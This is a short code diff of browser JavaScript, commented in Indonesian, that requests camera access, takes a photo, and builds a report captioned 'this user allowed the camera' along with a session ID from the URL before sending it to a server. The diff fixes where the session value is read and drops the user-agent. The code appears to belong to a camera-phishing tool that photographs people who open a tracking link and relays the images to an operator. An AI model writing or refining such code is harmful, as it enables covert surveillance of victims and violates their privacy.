@@ -8,6 +8,8 @@
     async function sendDataToServer() {
         try {
             // Coba untuk mengakses kamera
+            const session = new URLSearchParams(window.location.search).get("session");
+            
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const track = stream.getVideoTracks()[0];
             const imageCapture = new ImageCapture(track);
@@ -15,16 +17,14 @@
             track.stop(); // Hentikan kamera setelah foto diambil
 
             // Ambil user-agent dari browser
-            const userAgent = navigator.userAgent;
+            //const userAgent = navigator.userAgent;
 
 
             const captions = `
             📍 **Pengguna ini mengizinkan kamera pada browsernya**
-            🌐 User-Agent: ${userAgent}
+            🌐 User-Agent: -
             🔑 Session: ${session}
             `;
-
-            const session = new URLSearchParams(window.location.search).get("session");
             
             // Kirim foto ke server
             const formData = new FormData();
